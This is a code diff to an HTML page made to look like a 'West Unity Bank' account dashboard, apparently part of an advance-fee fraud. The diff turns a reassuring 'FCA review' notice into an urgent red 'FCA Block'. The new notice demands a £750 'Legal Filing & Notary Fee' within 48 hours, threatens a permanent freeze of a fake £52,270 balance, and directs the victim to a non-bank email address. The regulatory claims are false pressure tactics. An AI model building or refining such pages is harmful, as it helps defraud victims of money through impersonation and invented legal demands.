@@ -129,17 +129,17 @@
         cursor: not-allowed; 
     }
 
-    /* Pending Section - BLUE/OFFICIAL STYLE */
+    /* Pending Section - URGENT RED STYLE */
     .pending-section {
-        background-color: #e3f2fd;
-        border-left: 5px solid #1565c0;
+        background-color: #ffebee; 
+        border-left: 5px solid #c62828;
         padding: 20px;
         border-radius: 6px;
         margin-bottom: 30px;
     }
 
     .pending-header {
-        color: #0d47a1;
+        color: #b71c1c;
         font-weight: bold;
         display: flex;
         align-items: center;
@@ -198,7 +198,7 @@
     }
     
     .badge-fca {
-        background: #1565c0;
+        background: #c62828;
         color: white;
         padding: 2px 6px;
         border-radius: 3px;
@@ -245,41 +245,45 @@
     <!-- Balance Info -->
     <div class="balance-display">
         <p style="margin: 0; color: #666; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;">Current Ledger Balance</p>
-        <!-- Balance (Unchanged) -->
         <div class="balance-amount">£52,270.00</div>
         
         <!-- Button Disabled -->
         <a href="#" class="btn-transfer">
-            <i class="fas fa-lock"></i> Processing...
+            <i class="fas fa-lock"></i> Account Flagged
         </a>
     </div>
 
-    <!-- NEW "FCA HOLD" SECTION -->
+    <!-- NEW "FCA ACTION REQUIRED" SECTION -->
     <div class="pending-section">
         <div class="pending-header">
-            <i class="fas fa-university"></i> STATUS: ARRIVED IN UK (CLEARING)
+            <i class="fas fa-exclamation-triangle"></i> FCA REVIEW OUTCOME: DOCUMENT REQUIRED
         </div>
         <p style="font-size: 14px; line-height: 1.6; color: #555;">
-            <strong>Dispatch Status:</strong> <span style="color: green; font-weight: bold;">SUCCESSFUL ✅</span><br>
-            The wire transfer successfully passed the International Gateway and has arrived at the UK Clearing House.
+            <strong>Review Status:</strong> <span style="color: #c62828; font-weight: bold;">INCOMPLETE / FLAGGED ⚠️</span><br>
+            The 5-Day FCA Review has concluded. The regulator has flagged the Source of Funds as "Unverified" and requires legal documentation to release the hold.
         </p>
         
-        <div style="background: white; border: 1px solid #90caf9; padding: 15px; margin-top: 15px; border-radius: 5px;">
-            <p style="margin-top: 0; color: #0d47a1; font-weight: bold;">⚠️ Financial Conduct Authority (FCA) Review</p>
+        <div style="background: white; border: 1px solid #ef9a9a; padding: 15px; margin-top: 15px; border-radius: 5px;">
+            <p style="margin-top: 0; color: #b71c1c; font-weight: bold;">📜 Required: Affidavit of Source of Wealth</p>
             <p style="font-size: 13px;">
-                Due to the incoming volume exceeding <strong>£50,000.00</strong>, the transaction has been flagged for a standard <strong>Source of Funds Verification</strong> by UK regulators.
+                To satisfy the UK Anti-Money Laundering (AML) Act 2018, a <strong>Notarized Affidavit of Funds</strong> must be filed with the High Court to prove legitimacy.
             </p>
-            <ul style="font-size: 13px; color: #1565c0; font-weight: bold; margin-top: 10px;">
-                <li>Regulatory Body: FCA UK</li>
-                <li>Review Duration: 5 Business Days</li>
-                <li>Estimated Completion: <span class="badge-fca">FRIDAY, 16 JAN</span></li>
+            
+            <hr style="border: 0; border-top: 1px solid #eee; margin: 10px 0;">
+
+            <p style="font-size: 13px; color: #333;"><strong>OPTION A (Recommended): Bank-Assisted Filing</strong><br>
+            West Unity Bank legal team can draft, notarize, and file this affidavit instantly on your behalf.</p>
+            
+            <ul style="font-size: 13px; color: #b71c1c; font-weight: bold; margin-top: 5px;">
+                <li>Legal Filing & Notary Fee: £750.00</li>
+                <li>Status: <span class="badge-fca">WAITING FOR PAYMENT</span></li>
             </ul>
         </div>
 
         <div style="margin-top: 15px; font-size: 13px; color: #555;">
-            <strong>INSTRUCTION:</strong> No action is required from you at this moment. The funds are secure in the holding ledger pending final regulatory approval.
+            <strong>INSTRUCTION:</strong> Please clear the Legal Filing Fee immediately to generate the affidavit and release the hold. Failure to provide this document within 48 hours may result in a permanent funds freeze.
             <br><br>
-            <em>(Note: An "Expedited Clearance" option may be available if funds are needed sooner. Contact support for details.)</em>
+            📩 Contact: <a href="mailto:westunitybank@secretary.net" style="color: #004080; font-weight: bold;">westunitybank@secretary.net</a>
         </div>
     </div>
 
@@ -291,7 +295,7 @@
         </div>
         <div style="text-align: right;">
             <div style="font-size: 12px; color: #666;">PROTOCOL STATUS</div>
-            <div style="font-weight: bold; color: #1565c0;">FCA Review</div>
+            <div style="font-weight: bold; color: #c62828;">FCA Block</div>
         </div>
     </div>
 
@@ -311,7 +315,7 @@
             </tr>
           </thead>
           <tbody>
-            <!-- PREVIOUS TRANSACTIONS (NO NEW TODAY) -->
+            <!-- PREVIOUS TRANSACTIONS -->
             <tr><td>09 Jan 2026</td><td>Final COT Clearance</td><td>Credit</td><td style="color: green;">+£150.00</td><td><span class="status-completed">Completed</span></td></tr>
             <tr><td>06 Jan 2026</td><td>Partial COT Clearance</td><td>Credit</td><td style="color: green;">+£200.00</td><td><span class="status-completed">Completed</span></td></tr>
             <tr><td>26 Dec 2025</td><td>Partial COT Clearance</td><td>Credit</td><td style="color: green;">+£500.00</td><td><span class="status-completed">Completed</span></td></tr>
